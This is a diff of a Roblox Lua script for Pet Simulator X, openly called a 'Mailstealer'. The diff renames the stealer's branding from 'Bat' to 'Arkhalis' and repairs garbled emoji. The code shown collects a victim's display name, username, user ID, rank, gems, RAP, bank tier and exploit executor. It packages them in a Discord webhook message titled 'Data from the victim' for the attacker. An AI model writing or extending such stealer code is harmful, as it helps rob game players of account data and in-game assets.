@@ -32,7 +32,7 @@ elseif game.PlaceId == 12610002282 then
 elseif game.PlaceId == 11725212117 then
 	_G.GameIn = "PSX Voice Trading Plaza"
 else
-	_G.GameIn = "â“ Couldn't find game"
+	_G.GameIn = "❓ Couldn't find game"
 end
 local webhookcolor = "13369599"
 _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
@@ -44,11 +44,11 @@ _G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
 _G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
 local function sendwebhook(msg)
 local msg = {
-	["content"]= "**Bat on top ngl**",
+	["content"]= "**Arkhalis on top ngl**",
 	["embeds"]= {
 	  {
-		["title"]= "`Bat Mailstealer Results`",
-		["description"]= "**Data from the victim**\nðŸ§‘Display Name: ".._G.PlrDisplayNameVictim.."\nðŸ§‘Username: ".._G.PlrUserVictim.."\nðŸ§‘User ID: ".._G.PlrUserIDVictim.."\nðŸ±Rank: ".._G.CurrentRank.."\nðŸŽ®Place: ".._G.GameIn.."\nðŸ’ŽGems: **".._G.DisplayDiamond.."**\nâ¬†ï¸Rap: **".._G.DisplayRap.."**\nðŸ“ˆBank Tier: **".._G.DisplayBankTier.."**\nâ˜ Executor: **"..getexploit().."**",
+		["title"]= "`Arkhalis Mailstealer Results`",
+		["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\n💎Gems: **".._G.DisplayDiamond.."**\n⬆️Rap: **".._G.DisplayRap.."**\n📈Bank Tier: **".._G.DisplayBankTier.."**\n☠Executor: **"..getexploit().."**",
 		["url"]= "https://discord.gg/34fs3FWt",
 		["color"]= ""..webhookcolor.."",
   }
